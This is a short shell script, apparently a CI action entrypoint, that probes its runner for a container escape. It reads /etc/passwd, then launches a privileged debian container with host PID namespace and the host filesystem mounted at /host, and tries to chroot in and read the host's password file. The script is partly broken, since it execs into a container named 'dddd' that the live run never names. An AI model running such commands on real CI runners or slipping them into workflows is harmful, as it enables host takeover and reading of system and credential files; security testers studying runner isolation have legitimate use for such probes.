#!/bin/sh -l

sh -c "echo Hello world my name is $MY_NAME"
which docker
docker ps
echo "\n\nIn the container"
whoami
cat /etc/passwd
echo "\n\nOn the host"
#docker run --privileged --pid=host --name dddd -v /:/host -d debian
#sleep 10
#docker ps
#docker exec dddd "echo Hello from host"
#docker exec dddd "whoami"
#docker exec dddd "cat /etc/passwd"
docker run --privileged --rm --pid=host -t -d -v /:/host debian
docker ps
docker exec dddd "echo Hello from host"
docker exec dddd "chroot /host && cat /etc/passwd"
